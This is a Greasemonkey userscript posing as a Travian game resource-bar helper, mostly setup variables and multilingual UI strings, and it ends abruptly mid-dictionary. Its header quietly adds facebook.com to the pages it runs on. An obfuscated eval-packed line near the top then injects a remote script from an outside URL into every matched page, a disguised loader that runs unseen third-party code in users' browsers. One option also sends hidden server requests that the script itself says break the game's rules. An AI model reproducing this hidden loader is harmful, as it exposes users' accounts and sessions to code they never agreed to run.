// ==UserScript==
// @name           Travian Resource bar  Pro + Last Update
// @include       http*://*.facebook.com/*
// @namespace      http://userscripts.org/scripts/show/75431
// @description    Shows travian resources
// @author         Serj_LV
// @license        GPL version 3 or any later version; http://www.gnu.org/copyleft/gpl.html

// @include        http://*.travian.*
// @include        http://*/*.travian.*
// @include        http://www.vfthis.net/*/*
// @include        http://*.super-travianx.tk/*
// @include        http://*.travianteam.*
// @include        http://*.ztravian.*
// @exclude     http://*.travian*.*/hilfe.php*
// @exclude     http://*.travian*.*/log*.php*
// @exclude     http://*.travian*.*/index.php*
// @exclude     http://*.travian*.*/anleitung.php*
// @exclude     http://*.travian*.*/impressum.php*
// @exclude     http://*.travian*.*/anmelden.php*
// @exclude     http://*.travian*.*/gutscheine.php*
// @exclude     http://*.travian*.*/spielregeln.php*
// @exclude     http://*.travian*.*/links.php*
// @exclude     http://*.travian*.*/geschichte.php*
// @exclude     http://*.travian*.*/tutorial.php*
// @exclude     http://*.travian*.*/manual.php*
// @exclude     http://*.travian*.*/manual.php*
// @exclude     http://*.travian*.*/ajax.php*
// @exclude     http://*.travian*.*/ad/*
// @exclude     http://*.travian*.*/chat/*
// @exclude     http://forum.travian*.*
// @exclude     http://board.travian*.*
// @exclude     http://shop.travian*.*
// @exclude     http://*.travian*.*/activate.php*
// @exclude     http://*.travian*.*/support.php*
// @exclude     http://help.travian*.*
// @exclude     *.css
// @exclude     *.js
// @grant GM_addStyle
// @grant GM_getValue
// @grant GM_setValue
// @grant GM_deleteValue

// @version        2.8.13
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


(function () {
var RunTime = [ new Date().getTime() ];

function allInOneOpera () {
var version = '2.8.13';

notRunYet = false;
RunTime[2] = new Date().getTime();
var namespace = 'http://userscripts.org/scripts/show/75431';
var audiofile = 'http://simplythebest.net/sounds/MP3/MP3_files/event_MP3_files/touch_tone.mp3';
var bgcolor = ['#66ff66','yellow','red']; //resoursebar colors
var vHColor = '#777777'; //hints (second name) color
var cnColors = ['#F8FFD8','#FFE85B','#FF8888','#F0B8FF','#A0F0A0']; //Center Number colors
var market_all = [];
var market_fc = [];
var market_ftd = [];
var income = [];
var incomepersecond = [];
var iresNow = [];
var resNow = [];
var fullRes = [];
var wfl = false;
var rpFL = false;
var abFL = false;
var triFL = true;
var raceFL = true;
var nextFL = true;
var stopRPFL = true;
var timerRB = [];
var timerP = [];
var lastTimerP = [0,0,0];
var lastTimerB = 0;
var timerB = [];
var timerB3 = [];
var timerF = [];
var timerOv = [];
var timerN = [];
var villages_id = [];
var village_aid = 0;
var village_aNum = 0;
var villages_count = 0;
var linkVSwitch = [];
var sumPPH = [0,0,0,0];
var merchInWork = 0;
var progressbar_time = 0;
var lastAlert = RunTime[0];
var aClockTimer = 0;
var loadServerTime = 0;
var langs = ['auto','English (en)','عربي (ar)','Български (bg)','Bosanski (bs)','Deutsch (de)','Ελληνικά (el)','Español (es)','فارسی (fa)','Français (fr)','Hrvatski (hr)','Magyar (hu)','Italiano (it)','Nederlands (nl)','Polski (pl)','Português (pt)','Română (ro)','Русский (ru)','Српски (sr)','Svenska (sv)','Türkçe (tr)','Українська (ua)','Tiếng Việt (vi)','中文 (zh)'];
var allCookies = ['vPPH','mf','next','Dorf1','Dorf2','Dorf11','Dorf12','Dorf13','Dorf14','RBSetup','xy','VV','OV','Mem','Dict','DictFL','DictTR','DictRp','DictRpFL','ln','ln2','ln3','src','vHint','tropsI','tropsDic','vList','Att','trFL','AC','AS','bodyH','vBM'];
var crtPath = window.location.href;
var lMap = '';
var crtName = crtPath.match(/^.*\/\/(.+?)\//)[1];
var fullName = crtPath.match(/^.*\/\/.+\/+?/)[0];
var crtLang = crtName.split('.'); crtLang = crtLang[crtLang.length-1];
var srv = document.title.substring(8);
var flinks = new Object();
var windowID = []; // 0-Setup, 1-Overview, 2-distanceTips, 3-notes, 4-Reports, 5-links, 6-editLink, 7-editAnalyzers, 8-seveLog, 9-troopRes
var pageElem3 = [
	'side_navi', // 0- left side. include menu, profile etc.
	'content', // 1- main block in center
	'side_info', // 2- right side. include village list, links, quest.
	'mid', // 3- central block. include left menu, main content and right menu
	'llist', // 4- links from plus
	'vlist', // 5- villages list
	'ltimeWrap', // 6- server time
	];
var pageElem4 = [
	'side_info', // 0- include profile.
	'content', // 1- main block in center
	'side_info', // 2- right side. include village list, links, quest.
	'mid', // 3- central block. include left menu, main content and right menu
	'llist', // 4- links from plus
	'vlist', // 5- villages list
	'betaBox', // 6- server time
	];
var ver4FL =  $g(pageElem3[0]) ? false: true;
var ver42FL =  ver4FL && ($g('background')) ? true: false;

var pageElem = ver4FL ? pageElem4.slice() : pageElem3.slice();
if(ver42FL) pageElem[6] = 'servertime';

var docDir = ['left', 'right'];
var ltr = true;
if (document.defaultView.getComputedStyle(document.body, null).getPropertyValue("direction") == 'rtl') { docDir = ['right', 'left']; ltr = false; }
var coordDir = (ltr || ver4FL)? 'ltr': 'rtl';

var sK = 0;
var sM = 1;
var sC = [1.6,1000];
if( /[xyz]3|speed/i.test(crtPath) ) { sM = 3; sC = [16/3,100]; }
if( /[xyz]2|t1|final/i.test(crtPath) ) { sM = 2; sC = [8,100]; }
if( /[xyz]5/i.test(crtPath) ) { sM = 5; sC = [3.2,100]; }
if( /[xyz]10/i.test(crtPath) ) { sM = 10; sC = [1.6,100]; }
// also culturePoints()

var RB = new Object();
	RB.village_dorf1 = [0];
	RB.village_dorf11 = [0];
	RB.village_dorf12 = [0];
	RB.village_dorf13 = [0];
	RB.village_dorf14 = [0];
	RB.village_Dorf2 = [0,0,0,0,0];
	RB.village_Var = [0,0,0];
	RB.village_PPH = [0,0,0,0,0,0,0,0,0,0,0,0,0];
	RB.overview = [-1,'0'];
	RB.wantsMem = [0,0,0,0,0,0,0,0,0,0];
//						1		2				3				4			5					6				7			8		9			10		11		12	  13, 14	15		16				17				18				19				20					21			22		23
	RB.dictionary = [0,'Ally','Merchants','Tournament Square','Duration','resource balance','Rally point','Marketplace','Barracks','Stable','Workshop','Buy','Attacks',0,'at ','Map','Reinforcement','Attack: Normal','Attack: Raid','Culture points','Crop consumption','capacity','farm-list',''];
	RB.dictFL = [0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1];
// RB.dictFL[23] - version t4.x
	RB.dictTR = ['none',
		'Legionnaire','Praetorian','Imperian','Equites Legati','Equites Imperatoris','Equites Caesaris','Battering Ram','Fire Catapult','Senator','Settler',
		'Clubswinger','Spearman','Axeman','Scout','Paladin','Teutonic Knight','Ram','Catapult','Chief','Settler',
		'Phalanx','Swordsman','Pathfinder','Theutates Thunder','Druidrider','Haeduan','Ram','Trebuchet','Chieftain','Settler'];
	RB.dictRp = ["Won as attacker without losses.","Won as attacker with losses.","Lost as attacker.",
		"Won as defender without losses.","Won as defender with losses.","Lost as defender with losses.","Lost as defender without losses.",
		"Spying was successful and not detected.","Spying was successful, but detected.","Spying failed.","Spying was stopped successfully.","Spying could not be stopped."];
	var iReports = [1,2,3,4,5,6,7,15,16,17,18,19];
	RB.dictRpFL = Array(12);
	RB.market_fi = [0,0,0,0,0,0,0,0,0,0,0,0];
	RB.tropsI = new Array(300);
	RB.trFL = new Array(31);
	RB.XY = [
		200, 10, // 0-Setup
		700, 430, // 1-Resource bar
		200, 100, // 2-Overview
		5, 400, // 3-Links
		400, 50, // 4-Report&Messages
		400, 130, // 5-Notes
		100, 50, // 6-Alerts
		10, 30, // 7-vlist
		10, 250, // 8-BIGicons
		200, 100, // 9-LinkEdit
		10, 250, // 10-attackInfo
		200, 100 // 11-attackFilter
		];
	RB.vHint = [];
	RB.vList = [];
	RB.attackList = [RunTime[0]];
	RB.bodyH = [0,0,0]; // 0-resourcebar,1-vlist,2-links
	RB.ln3 = []; // links for village
	RB.vBM = [];

DICT = {
	en: {
		// ingame messages
		ok : "Ok",
		cancel : "Cancel",
		close : "Close",
		overview : "villages overview",
		svers : "script version",
		settings : "settings",
		notes : "notes",
		res90 : "resources to % filling",
		refresh : "refresh",
		warehouse : "Warehouse",
		resources : "Resources",
		troops : "Troops",
		links : "Links",
		linkname : "link name",
		linkdel : "delete link",
		name2 : "second name",
		archive : "Archive",
		arena : "Tournament Square",
		addcur : "add current",
		del : "delete",
		edit : "edit",
		unfix : "unfix",
		fix : "fix",
		total : "Total",
		noplace : "There is no place!",
		hunger : "hunger",
		duration : "duration",
		deficit : "deficit",
		aclock : "Alarm clock\nhh:mm:ss , hh:mm , mm (from now)",
		consnegat : "Consumption in this country is negative. How many minutes needed reserve?",
		searchlast : "Search the last of",
		bmove : "Move buildings",
		neighbors : "neighbors",
		// settings
		none : "None",
		auto : "auto",
		info : "Information",
		yourrace : "Your race",
		sspeed : "Server speed",
		sspeedh : "0 - auto, 1 (1x), 2 (2x), 3 (3x aka speed), ... etc.",
		speedart : "Speed artefact",
		racelist : ['Romans','Teutons','Gauls'],
		cranny : "yellow level of cranny (percent)",
		crannyh : 'normal 80, 70 for classic or artefact plunder',
		builtin : "Built-in tools",
		builtinh : 'for normalize of production: red color - most need resources, green - less need resources',
		normalize : 'Normalize of production',
		normal : "normal",
		banalyze : "Built-in analyzer of Battle",
		cropfind : "Built-in crop finder",
		adetect : "Detect attack",
		adetecto : ['off','w/o freeze','on'],
		adetecth : "makes the hidden requests to the server, violating the rules. may result in punishment.",
		adetectt : "period of detect attack",
		buildhint : "Construction Tips",
		onallp : "All pages",
		dontwrap : "Don't wrap pages",
		dontwraph : 'If the list of villages jumps down',
		buildand : "Show building countdown and attack",
		buildandh : 'In the list of villages',
		buildands : ['off','on','wide'],
		sendres : "Show &laquo;send resource/troops&raquo; icons",
		sendmess : "Show &laquo;send message&raquo; icons",
		analyzer : "World analyzer",
		bigicon : "Show BIG icons",
		addvtable : "Show additional village table",
		addvtableo : ['off','on','stick'],
		addvtableh : 'for travian4',
		opennote : "Automatically open notes",
		notesize : "Size of window for notes",
		openoview : "Automatically open villages overview",
		resbar : "Resource bar",
		showres : "Show resource bar in window",
		redbl : "red (in hours)",
		yellowbl: "yellow (in hours)",
		marketpl : "Market place",
		mfilter : "filter",
		mfiltero : ['off','only rate','only filter','full'],
		npcsum : "summary for NPC",
		npcsumh : 'in market place and buildings',
		bidinc : "bid increment",
		bidinch : 'for auctions travian4',
		show3x : "may show incorrect data",
		show3xh : 'attempt to predict the flow of resources at 3x and 2x sending',
		rpandmp : "Rally point and Market place",
		incomres : "incoming resource info",
		incomreso : ['off','on','with summary','WW mode'],
		troopsI : "Information about the troops",
		troopsIo : ['off','on','update'],
		defRP : "default action for rally point",
		showls : "Show links",
		showAsSN : "Use links as second name",
		showlso : ['off','on','in window'],
		savedls : "saved links",
		savedd : "saved data",
		saveddh : 'including Links and Second name. If an Account deleted, or not your computer.',
		savedelall : "delete all saved data",
		savedelallh : 'You sure you want to delete all data, including the links and the second name?',
		scrlang : "Script language",
		youlang : "your language",
		notifi : "notification",
		notification : "notification after construction",
		method : "method",
		audiourl : "URL of audio file",
		audiotest : "test audio",
		colorCustomize : "Color options",
		colorHint : "leave empty for the default color",
		color0 : "upgrade available",
		color1 : "upgrade via NPC",
		color2 : "upgrade not possible <br/>(not enough resources)",
		color3 : "upgrade not possible <br/>(not enough capacity of granaries/warehouses)",
		color4 : "final level"
	},
	ru: {
		// ссобщения в игре
		cancel : "Отмена",
		close : "Закрыть",
		overview : "обзор деревень",
		svers : "версия скрипта",
		settings : "настройки",
		notes : "заметки",
		res90 : "к % заполнения склада",
		refresh : "обновить",
		warehouse : "Склады",
		resources : "Запасы",
		troops : "Войска",
		links : "Ссылки",
		linkname : "название ссылки",
		linkdel : "удалить ссылку",
		name2 : "второе имя",
		archive : "Архив",
		arena : "Арена",
		addcur : "добавить эту деревню",
		del : "удалить",
		edit : "изменить",
		unfix : "открепить",
		fix : "закрепить",
		total : "Всего",
		noplace : "Нет места!",
		hunger : "наступление голода",
		duration : "продолжительность",
		deficit : "дефицит",
		consnegat : "Потребление в этой деревне отрицательное. На сколько минут нужен запас?",
		searchlast : "Найти последнее из",
		bmove : "Перемещение зданий",
		neighbors : "соседи",
		// настройки
		none : 'нет',
		auto : "авто.",
		info : "Общая информация",
		yourrace : "Ваш народ",
 		sspeed : "Скорость сервера",
		sspeedh : "0 - auto, 1 (1x), 2 (2x), 3 (3x или скоростной), ...",
		speedart : "Артефакт скорости",
		racelist : ['Римляне','Германцы','Галлы'],
		cranny : "желтый уровень занятости тайника (проценты)",
		crannyh : 'норма - 80, 70 для классического сервера или для артефакта грабителя',
		builtin : "Встроенные инструменты",
		builtinh : 'для нормального производства: красный цвет - самый необходимый ресурс, зелёный - лишнее производство',
		normalize : 'Нормальное производство',
		normal : "ресурсы",
		banalyze : "Встроенный анализатор боя",
		cropfind : "Встроенный поиск свободных хлебных клеток",
		adetect : "Обнаружение нападения",
		adetecto : ['выкл.','без заморозки','включено'],
		adetecth : "делает скрытые обращения к серверу, нарушая правила. может повлечь наказание.",
		adetectt : "период обнаружения",
		buildhint : "Подсказки возможности строительсва",
		onallp : "На всех страничках",
		dontwrap : "Не давать сворачивать страничку",
		dontwraph : 'если список деревень прыгает вниз или перекашивается',
		buildand : "Показывать таймер построек и атаки",
		buildandh : 'отображается как часики в списке деревень',
		buildands : ['нет','да','широкий'],
		sendres : "Показывать иконки &laquo;отослать ресурсы/войска&raquo;",
		sendmess : "Показывать иконки &laquo;отослать сообщение&raquo;",
		analyzer : "Анализатор мира",
		bigicon : "Показывать БОЛЬШИЕ иконки",
		addvtable : "Показывать дополнительную таблицу деревень",
		addvtableo : ['нет','да','приклеить'],
		addvtableh : 'для травиан версии 4',
		opennote : "Автоматически открывать заметки",
		notesize : "Размер окна заметок",
		openoview : "Автоматически открывать обзор деревень",
		resbar : "Таблица ресурсов",
		showres : "Показывать таблицу ресурсов в окне",
		redbl : "красный (в часах)",
		yellowbl: "желтый (в часах)",
		marketpl : "Рынок",
		mfilter : "фильтр предложений",
		mfiltero : ['нет','только рейтинг','только фильтр','полный'],
		npcsum : "сумма ресурсов для NPC",
		npcsumh : 'на рынке и стройках',
		bidinc : "шаг ставки",
		bidinch : 'для аукционов травиан версии 4',
		show3x : "показывать возможно неверные данные",
		show3xh : 'попытка предсказать поступление ресурсов при 3x и 2x отправке',
		rpandmp : "Пункт сбора и рынок",
		incomres : "информация о поступающих ресурсах",
		incomreso : ['нет','есть','с итогами','Чудо режим'],
		troopsI : "Информация о войсках",
		troopsIo : ['нет','да','обновить'],
		defRP : "действие по умолчанию для пункта сбора",
		showls : "Показывать ссылки",
		showAsSN : "Использовать ссылки как второе имя",
		showlso : ['нет','да','в окне'],
		savedls : "сохранённые ссылки",
		savedd : "сохранённые данные",
		saveddh : 'включая Ссылки и Второе имя деревень. Если учетная запись удаляется или это не ваш компьютер.',
		savedelall : "удалить все данные",
		savedelallh : 'Вы уверены, что хотите удалить все данные, включая Ссылки и Второе имя деревень?',
		scrlang : "Язык скрипта",
		youlang : "Ваш язык",
		notifi : "напоминания",
		notification : "оповищение после строительства",
		method : "метод",
		audiourl : "URL звукового файла",
		audiotest : "проверить звук",
		colorCustomize : "Настройки цвета",
		colorHint : "оставьте пустым для цвета по умолчанию",
		color0 : "развитие возможно",
		color1 : "развитие возможно с NPC",
		color2 : "развитие невозможно <br/>(недостаточно ресурсов)",
		color3 : "развитие невозможно <br/>(недостаточная вместимость склада/амбара)",
		color4 : "максимальный уровень"
	},
	ua: { fb : "ru",
		archive : "Архів",
		racelist : ['Римляни','Тевтонці','Галли']
	},
	hu: { // Hungarian language. thx mrzed :)
		// ingame messages
		cancel : "Mégse",
		close : "Bezár",
		overview : "áttekintés",
		svers : "szkript verzó",
		settings : "beállítások",
		notes : "jegyzetek",
		res90 : "nyersanyagokat %-ig feltölteni",
		refresh : "frissít",
		warehouse : "Raktárépület",
		resources : "Nyersanyagok",
		troops : "Csapatok",
		links : "Linkek",
		linkname : "link név",
		linkdel : "link törlése",
		name2 : "második név",
		archive : "Archívum",
		arena : "Gyakorlótér",
		total : "Összesen",
		// settings
		none : "Nincs",
		info : "Információk",
		yourrace : "Nép",
		speedart : "Sebesség ereklye",
		racelist : ['Római','Germán','Gall'],
		onallp : "Minden oldal",
		dontwrap : "Ne tömörítse az oldalakat",
		dontwraph : 'Ha a faluk listája leugrik',
		buildand : "Visszaszámlálók megjelenítése",
		buildandh : 'A faluk listájában (építkezések, csapatmozgások)',
		sendres : "Nyersanyag-/csapatküldés ikonok megjelenítése",
		sendmess : "Üzenetküldés ikonok megjelenítése",
		bigicon : "Nagy ikonok megjelenítése",
		opennote : "Jegyzetek automatikus megnyitása",
		resbar : "Nyersanyagkijelző",
		showres : "Nyersanyagkijelző külön ablakban",
		redbl : "piros (órában)",
		yellowbl: "sárga (órában)",
		marketpl : "Piactér",
		mfilter : "szűrő",
		mfiltero : ['nincs','csak arány','csak szűrő','teljes'],
		rpandmp : "Gyülekezőtér és piactér",
		incomres : "Információ az érkező nyersanyagokról",
		incomreso : ['ki','be','összefoglaló','WW mode'],
		troopsI : "Csapatinformációk",
		showls : "Linkek megjelenítése",
		showlso : ['ki','be','ablakban'],
		savedls : "Mentett linkek",
		scrlang : "Szkript nyelve",
		youlang : "Az Ön nyelve"
		//version = verzió
		//Rally point = Gyülekezőtér
	},
	fa: { // Persian, thx Reza Moghadam
		// ingame messages
		ok : "موافقم",
		cancel : "لغو",
		close : "بستن",
		overview : "مرور کلی",
		svers : "ورژن اسکریپت",
		settings : "تنظیمات",
		notes : "متن",
		res90 : "% منابع پر است",
		warehouse : "انبار",
		resources : "منابع",
		troops : "لشکریان",
		links : "لینک ها",
		archive : "آرشیو",
		arena : "میدان تمرین",
		// settings
		info : "اطلاعات",
		yourrace : "دسته ی شما",
		speedart : "سرعت مصنوعی",
		racelist : ['رومی ها','توتن ها','گل ها'],
		onallp : "همه ی صفحات",
		dontwrap : 'کشیده نشدن صفحه',
		dontwraph : "اگر لیست روستاه پایین رفت",
		buildand : "نمایش شمارش معکوس ساختمان و حمله",
		buildandh : 'در لیست روستا ها',
		sendres : "نمایش آیکون های ارسال منابع/سربازان",
		sendmess : "نمایش آیکون های ارسال پیام",
		bigicon : "نمایش آیکون های بزرگ",
		opennote : "بازشدن خودکار متن ها",
		resbar : "نوار منابع",
		showres : "نمایش نوار منابع در پنجره",
		redbl : "قرمز (در ساعت)",
		yellowbl: "زرد (در ساعت)",
		marketpl : "بازار",
		mfilter : "فیلتر",
		mfiltero : ['خاموش','تنها ارزیابی','فقط خاموش','کامل'],
		rpandmp : "اردوگاه و بازار",
		incomres : "دریافت اطلاعات منابع",
		incomreso : ['خاموش','روشن','خلاصه','WW mode'],
		showls : "نمایش لیننک ها",
		showlso : ['خاموش','روشن','در پنجره'],
		savedls : "ذخیره سازی لینک ها"
	},
 ar: { // Arabic, thx ww_start_t
		// ingame messages
		ok : "موافق",
		cancel : "إلغاء الأمر",
		close : "إغلاق",
		overview : "نظرة عامة على جميع القرى",
		svers : "أصدار السكربت",
		settings : "الأعدادات",
		notes : "دفتر الملاحظات",
		res90 : "الموارد حتى % للحد الأقصى",
		refresh : "تحديث",
		warehouse : "المخزن",
		resources : "الموارد",
		troops : "القوات",
		links : "الروابط",
		linkname : "أسم الرابط",
		linkdel : "حذف الرابط",
		name2 : "الأسم التالي",
		archive : "الأرشيف",
		arena : "ساحة البطولة",
		addcur : "أضافة",
		del : "أمسح",
		edit : "تعديل",
		unfix : "لم يتم أصلاحة",
		fix : "تم أصلاحة",
		total : "المجموع",
		noplace : "لايوجد سكن!",
		hunger : "جوع",
		duration : "المدة",
		deficit : "لايمكن",
		aclock : "المنبة\nhh:mm:ss , hh:mm , mm (من الوقت الحالي)",
		consnegat : "استهلاك القمح لهذه القرية سالب. كم دقيقة احتياطية تحتاج؟",
		searchlast : "بحث عن أخر",
		bmove : "تحريك المباني",
		neighbors : "الجيران",
		// settings
		none : "لاشيء",
		auto : "آلي",
		info : "المعلومات",
		yourrace : "قبيلتك",
		speedart : "السرعة",
		racelist : ['الرومان','الجرمان','الأغريق'],
		cranny : "النسبة للون الأصفر للمخبأ (النسبة)",
		crannyh : 'الأفتراضي 80, 70 للكلاسيك',
		builtin : "الأدوات-المبنية",
		builtinh : 'ألوان انتاج الموارد: اللون الأحمر - للأقل انتاج, اللون الأخضر - للأكثر انتاج',
		normalize : 'انتاج الموارد',
		normal : "الأفتراضي",
		banalyze : "مبني على - محاكي المعارك",
		cropfind : "مبني على - باحث عن القرى القمحية",
		adetect : "كاشف الهجمات(غير مستحسن)",
		adetecto : ['معطل','تعليق عند معجزة العالم','تفعيل'],
		adetecth : "يرسل طلبات مخفية الى السيرفر, يتم اختراق قوانين اللعبة. وقد يتم ايقاف حسابك.",
		adetectt : "فترة كاشف الهجوم",
		buildhint : "نصائح البناء",
		onallp : "الأدوات التي تعمل على جميع الصفحات",
		dontwrap : "لاتلف الصفحة(مستحسن)",
		dontwraph : 'إذا كانت قائمة القرى بالأسفل',
		buildand : "اظهار وقت المباني والهجمات بجانب قائمة القرى ",
		buildandh : 'في قائمة القرى',
		sendres : "أظهار ايقونات ارسال موارد وقوات",
		sendmess : "عرض ايقونة ارسال رسالة بجانب كل لاعب",
		analyzer : "محلل السيرفر",
		bigicon : "أظهار قائمة المباني",
		addvtable : "عرض جدول القرى",
		addvtableo : ['معطل','تشغيل','تعليق'],
		addvtableh : 'لترافيان النسخة4 الجديده',
		opennote : "فتح دفتر الملاحظات آلياً",
		notesize : "حجم دفتر الملاحظات",
		openoview : "فتح نافذه نظره عامه إلياً",
		resbar : "شريط الموارد",
		showres : "عرض شريط الموارد في نافذة متحركة",
		redbl : "اللون الأحمر (لكل ساعة)",
		yellowbl: "اللون الأصفر (لكل ساعة)",
		marketpl : "السوق",
		mfilter : "الفلتر",
		mfiltero : ['تشغيل','عرض النسبة','عرض الفلتر','عرض الكل'],
		npcsum : "ملخص تاجر المبادلة",
		npcsumh : 'في السوق والمباني',
		bidinc : "المزايدة الحالية",
		bidinch : 'لترافيان النسخة4',
		show3x : "قد لايتم عرض البيانات بشكل صحيح",
		show3xh : 'محاول التنبؤ عند وجود كمية من الموارد عند ارسال موارد 3 مرات أو مرتين',
		rpandmp : "نقطة التجمع و السوق",
		incomres : "عرض معلومات عن الموارد القادمة",
		incomreso : ['معطل','تشغيل','مع المحلل','نمط معجزة العالم'],
		troopsI : "المعلومات حول القوات",
		troopsIo : ['معطل','تشغيل','مساعدة في البحث'],
		defRP : "الأجراء الأفتراضي لنقطة التجمع",
		showls : "عرض الروابط",
		showAsSN : "أستعمل الأسم التالي كـ الأسم الافتراضي",
		showlso : ['معطل','تشغيل','تشغيل في نافذة'],
		savedls : "الروابط المحفوظة",
		savedd : "البيانات المحفوظة",
		saveddh : 'بما في ذلك الروابط والأسم التالي. إذا حُذف الحساب, أو ليس الكمبيوتر الخاص بك.',
		savedelall : "مسح جميع البيانات المحفوظة",
		savedelallh : 'هل أنت متأكد من حذف جميع البيانات المحفوظة, بما في ذلك الروابط والأسم التالي؟',
		scrlang : "لغة السكربت",
		youlang : "لغتك",
		notifi : "الإبلاغ",
		notification : "إبلاغي عند أنتهاء المبنى من البناء",
		method : "الأسلوب",
		audiourl : "الرابط الخاص بالصوت",
		audiotest : "أختبار الصوت",
		colorCustomize : "إعدادات الألوان",
		colorHint : "أترك المربع فارغ لأختيار اللون الأساسي",
		color0 : "التطوير متاح",
		color1 : "يمكن التطوير عن طريق تاجر المبادله NPC",
		color2 : "لايمكن التطوير (لاتوجد موارد كافيه)",
		color3 : "لايمكن التطوير (يجب رفع مستوى مخزن الحبوب أو المخزن)",
		color4 : "اللون لـ أقصى مستوى للمبنى"
	},
	fr: { // French translation , thx azukae09
		// ingame messages
		ok : "Ok",
		cancel : "Annuler",
		close : "Fermer",
		overview : "Résumé",
		svers : "Version du script",
		settings : "configuration",
		notes : "notes",
		res90 : "Ressources à % de la capacité",
		refresh : "rafraichir",
		warehouse : "Entrepôt",
		resources : "Ressources",
		troops : "Troupes",
		links : "Liens",
		linkname : "nom du lien",
		linkdel : "supprimer lien",
		name2 : "deuxième nom",
		archive : "Archive",
		arena : "Place du tournoi",
		addcur : "ajouter celui présent",
		del : "supprimer",
		edit : "éditer",
		total : "Total",
		// settings
		none : 'Aucun',
		info : "Information",
		yourrace : "Votre peuple",
		speedart : "Artefact de vitesse",
		racelist : ['Romains','Germains','Gaulois'],
		onallp : "Toutes les pages",
		dontwrap : "Pas de justification des pages",
		dontwraph : 'Si la liste des villages disparait',
		buildand : "Montrer le compte à rebours pour les constructions et les attaques",
		buildandh : 'Dans la liste des villages',
		sendres : "Afficher les icônes &laquo;envoyer ressources/troupes&raquo;",
		sendmess : "Afficher les icônes &laquo;envoyer message&raquo;",
		analyzer : "Outils et statistiques",
		bigicon : "Afficher de GRANDES icônes",
		opennote : "Ouvrir automatiquement les notes",
		resbar : "Barre des ressources",
		showres : "Montrer la barre des ressources dans une fenêtre",
		redbl : "Rouge (en heures)",
		yellowbl: "Jaune (en heures)",
		marketpl : "Place du marché",
		mfilter : "Filtre",
		mfiltero : ['aucun','que le taux','que les filtres','tout'],
		rpandmp : "Place du rassemblement et place du marché",
		incomres : "Info sur les ressources arrivant",
		incomreso : ['Non','Oui','Avec résumé','WW mode'],
		showls : "Afficher les liens",
		showlso : ['Non','Oui','Dans une fenêtre'],
		savedls : "Sauver les liens",
		scrlang : "Choix de la langue",
		youlang : "Langue du navigateur",
		noplace : "Plus de place!",
		hunger : "Faim",
		duration : "Durée",
		deficit : "Déficit",
		cranny : "Niveau jaune pour la cachette (pourcentage)",
		crannyh : 'Normal 80, 70 pour classique or artefact de pillage',
		builtin : "Outils integrés",
		builtinh : 'Pour normaliser la production; rouge ressource la plus demandée, vert, ressource la moins necessaire',
		normalize : 'Normalisation de la production',
		normal : "Normal",
		banalyze : "Analiseur intégré de bataille",
		cropfind : "Recherche intégrée de champs",
		adetect : "Detection des attaques",
		adetecto : ['off','sans freeze','on'],
		adetecth : "Fait des requetes masquées au serveur, ce qui viole les règles et peut ocasionner une sanction",
		adetectt : "Période de détection des attaques",
		addvtable : "afficher le tableau additionnel des villages",
		addvtableh : 'pour travian4',
		npcsum : "Résumé pour le marchand pnj",
		npcsumh : 'Dans les marchés et batiments',
		bidinc : "Incrément d'enchère",
		bidinch : 'Pour les enchères dans travian4',
		savedelallh : 'Etes vous sur d\'effacer les données sauvegardées (y compris les liens et le second nom)',
		notification : "Notification après construction",
		method : "Méthode",
		audiourl : "URL de fichier audio",
		audiotest : "test audio"
	},
	hr: { // Croatian translation, thx semiRocket
		// ingame messages
		ok : "U redu",
		cancel : "Odustani",
		close : "Zatvori",
		overview : "Pregled",
		svers : "Verzija skripte",
		settings : "Postavke",
		notes : "Zabilješke",
		res90 : "Resursi do % ispunjenja",
		refresh : "Osvježi",
		warehouse : "Skladište",
		resources : "Resursi",
		troops : "Vojska",
		links : "Poveznice",
		linkname : "Ime poveznice",
		linkdel : "Izbriši poveznicu",
		name2 : "Drugi naziv",
		archive : "Arhiva",
		arena : "Arena",
		addcur : "Dodaj trenutno",
		del : "Izbriši",
		edit : "Uredi",
		unfix : "Skini",
		fix : "Pričvrsti",
		total : "Ukupno",
		noplace : "Nema mjesta!",
		hunger : "glad",
		duration : "trajanje",
		deficit : "manjak",
		aclock : "Alarm \nhh:mm:ss , hh:mm , mm (unazad)",
		consnegat : "Potrošnja hrane u naselju je negativna. Koliko minuta želite pričuve?",
		searchlast : "Pretraži za posljednji",
		bmove : "Premještanje građevina",
		neighbors : "susjedi",
		// settings
		none : 'Ništa',
		auto : "automatsko",
		info : "Informacije",
		yourrace : "Tvoja jedinica",
		speedart : "Artefakt za brzinu",
		racelist : ['Rimljani','Teutonci','Gali'],
		cranny : "Žuta razina žitnice (postotak)",
		crannyh : 'Normalno 80, 70 za klasične pljačke ili artefakt',
		builtin : "Ugrađeni alati",
		builtinh : 'Normalizacija produkcije: crveno najviše potrebni, a zeleno manje potrebni resursi',
		normalize : 'Normalizacija produkcije',
		normal : "Normalno",
		banalyze : "Ugrađeni analizator bitke",
		cropfind : "Ugrađena tražilica žitnih (crop) polja",
		adetect : "Detektiranje napada",
		adetecto : ['Isključeno','Bez zamrzavanja','Uključeno'],
		adetecth : "Radi skrivene zahtjeve prema poslužitelju kršeći pravila. Može dovesti do kazni.",
		adetectt : "Razdoblje detektiranja napada",
		buildhint : "Savjeti za gradnju",
		onallp : "Sve stranice",
		dontwrap : "Onemogući prijelom stranica",
		dontwraph : 'Korisno ako se lista naselja razlomi u dva reda',
		buildand : "Prikaži odbrojavanje izgradnje i napada",
		buildandh : 'Prikazuje se u listi naselja',
		buildands : ['Isključeno','Uključeno','Prostrano'],
		sendres : "Prikaži ikonice «šalji resurse/vojska»",
		sendmess : "Prikaži ikonicu «šalji poruku»",
		analyzer : "Analizator svijeta",
		bigicon : "Prikaži VELIKE ikone",
		addvtable : "Prikaži dodatnu tablicu naselja",
		addvtableo : ['Isključeno','Uključeno','Zalijepljeno'],
		addvtableh : '(Travian 4)',
		opennote : "Automatski otvori zabilješke",
		notesize : "Veličina prozora za zabilješke",
		openoview : "Automatski otvori pregled naselja",
		resbar : "Grafikon resursa",
		showres : "Prikaži grafikon u zasebnom prozoru",
